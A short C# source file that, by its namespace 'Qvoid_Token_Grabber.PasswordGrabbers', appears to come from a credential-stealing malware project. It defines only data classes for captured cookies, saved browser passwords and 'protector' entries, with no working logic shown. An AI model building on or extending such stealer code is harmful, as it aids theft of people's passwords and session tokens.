
namespace Qvoid_Token_Grabber.PasswordGrabbers
{
    class Protector
    {
        public string Directory { get; set; }
        public string Name { get; set; }
    }

    class Cookie
    {
        public string HostName { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
    }

    class Passwords
    {
        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }
    }
}
